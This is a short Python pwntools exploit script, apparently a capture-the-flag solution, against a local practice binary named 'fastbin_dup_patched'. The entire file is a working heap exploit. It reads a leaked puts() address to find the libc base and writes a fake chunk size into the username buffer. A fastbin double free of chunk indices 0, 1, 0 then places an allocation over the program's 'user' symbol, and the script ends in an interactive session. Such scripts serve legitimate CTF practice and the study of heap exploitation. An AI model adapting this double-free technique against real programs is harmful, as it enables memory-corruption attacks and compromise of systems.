#!/usr/bin/env python3

from pwn import *

exe = ELF("./fastbin_dup_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.30.so")

context.binary = exe

p = process()

def create(size,content):
    p.sendlineafter(b'> ',b'1')
    p.sendlineafter(b'size: ',size)
    p.sendafter(b'data: ',content)

def delete(idx):
    p.sendlineafter(b'> ',b'2')
    p.sendlineafter(b'index: ',idx)

def target():
    p.sendlineafter(b'> ',b'3')


p.recvuntil(b'puts() @ ')
leak = int(p.recvline()[:-1],16)
print(hex(leak))
libc.address = leak - libc.sym.puts

log.info(f"libc: {hex(libc.address)}")

p.sendlineafter(b'Enter your username: ',p64(0xdeadbeefcafebabe) + p64(0x31))
input()
create(str(0x20),b'aaa')
create(str(0x20),b'bbb')

delete(str(0))
delete(str(1))
delete(str(0))

create(str(0x20),p64(exe.sym.user))
create(str(0x20),b'a')
create(str(0x20),b'b')

create(str(0x20),b'phuocloideptrai')

p.interactive()
